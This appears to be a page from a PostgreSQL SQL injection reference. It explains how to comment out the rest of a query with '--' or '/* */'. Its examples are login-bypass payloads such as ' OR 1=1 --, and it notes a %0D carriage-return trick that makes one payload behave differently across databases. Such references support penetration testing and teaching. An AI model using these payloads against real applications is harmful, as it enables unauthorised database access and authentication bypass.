---
title: Comment Out Query
description: Techniques for commenting out the remainder of SQL queries in PostgreSQL
category: Basics
order: 3
tags: ["comments", "basics", "query manipulation"]
lastUpdated: 2026-10-08
---

The following methods can be used to comment out the rest of a query after your injection:

| Comment Syntax | Description           |
| -------------- | --------------------- |
| `--`           | SQL line comment      |
| `/* */`        | C-style block comment |

## Examples

```sql
SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
```

```sql
SELECT * FROM Users WHERE username = '' OR 1=1 /*' AND password = ''*/;
```

## Notes

- PostgreSQL uses standard SQL comment syntax
- The `--` comment extends to the end of the line, and needs no space after it: `SELECT 1--1` returns `1`
- A carriage return (`%0D`) ends a `--` comment as well as a line feed, so code after `%0D` runs: `' OR 1=1--x%0D AND 1=0` keeps the `AND 1=0`. MySQL, MariaDB and Oracle only end it at a line feed, which lets one payload behave differently per database
- Block comments `/* */` can be nested in PostgreSQL (unlike some other databases)
- The `#` hash comment (used in MySQL) does NOT work in PostgreSQL
